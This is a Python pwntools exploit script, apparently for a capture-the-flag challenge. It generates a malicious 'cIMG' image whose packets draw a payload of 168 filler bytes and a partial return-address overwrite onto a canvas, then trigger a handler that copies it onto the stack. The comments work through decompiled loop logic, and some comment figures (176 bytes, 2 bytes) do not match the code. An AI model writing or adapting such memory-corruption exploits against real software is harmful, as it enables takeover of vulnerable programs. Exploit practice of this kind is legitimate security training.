from pwn import *
import string

# --- CONFIGURATION ---
# We use a pattern to debug the layout.
# 176 bytes of pattern + 2 bytes of 'BB' (Target)
pattern = b"A" * 168
overwrite = b'\x42\x3b\x40'
payload_blob = pattern + overwrite
total_size = len(payload_blob)

print(f"[*] Payload Size: {total_size}")

# --- GENERATE CIMG ---
# Header: Magic, Ver 4, Width 300 (Safe), Height 10
cimg = b"cIMG" + p16(4) + p8(44) + p8(1) + p32(3) # 44 = 300%256 (Wrap issue? No p8 takes int)
# Wait, p8(300) will crash/truncate.
# We need to send Global Width 255 (Max for p8). 
# If payload is 178, 255 is safe.
cimg = b"cIMG" + p16(4) + p8(255) + p8(10) + p32(3)

# PACKET 1: LOAD (handle_3)
# We need to test the Width/Height relationship.
# Based on decompilation:
# Byte 1 -> Offset 25 (Stride/Width)
# Byte 2 -> Offset 24 (Limit/Height)
# 
# HYPOTHESIS: We want Stride to be 1. Limit to be Total.
# So Byte 1 = 1. Byte 2 = Total.
# 
# BUT: handle_4 loop structure:
# while(Offset 24 > v17) {
#    for(k=0; Offset 25 > k; k++) {
#       idx = k + v17 * Offset 25
#    }
# }
#
# If Byte 1 (Off 25) = 1: k runs 0..0.
# If Byte 2 (Off 24) = Total: v17 runs 0..Total.
# idx = 0 + v17 * 1. Reads 0..Total.
# X Coord = (0 + X) % GlobalW.
# Y Coord = (v17 + Y).
# RESULT: Vertical Line (X=0, Y=0..Total).
#
# THIS IS THE BUG. We are drawing Vertically. handle_1337 reads Horizontally.
#
# CORRECTION:
# We want Horizontal Line. Y must be constant. X must increment.
# So v17 (Y loop) must run ONCE. -> Byte 2 (Offset 24) = 1.
# So k (X loop) must run TOTAL. -> Byte 1 (Offset 25) = Total.

cimg += p16(3)             
cimg += p8(0)              
cimg += p8(total_size)     # Byte 1 (Offset 25) -> WIDTH of sprite (Inner Loop Limit)
cimg += p8(1)              # Byte 2 (Offset 24) -> HEIGHT of sprite (Outer Loop Limit)
cimg += payload_blob       

# PACKET 2: RENDER (handle_4)
# Render the sprite.
# Stride is set to Total_Size (from packet 1).
# Height is set to 1 (from packet 1).
# It will draw 1 row of Total_Size pixels.
cimg += p16(4) + p8(0) + p8(0) + p8(0) + p8(0) + p8(0) + p8(0) 
cimg += p8(1) + p8(1) + p8(0xFF) # Repeat loops just once.

# PACKET 3: TRIGGER (handle_1337)
# Copy canvas (horizontal row) to stack.
cimg += p16(1337) + p8(0) + p8(0) + p8(0) + p8(total_size) + p8(1) + p16(0)

with open("debug.cimg", "wb") as f:
    f.write(cimg)

print("[+] 'debug.cimg' generated with HORIZONTAL configuration.")
print("[*] Run GDB. Check $rsp.")
print("[*] If you see '61616162...' (aaab...), it's working.")
print("[*] If you see '61202020...' (a   ...), we are still vertical.")
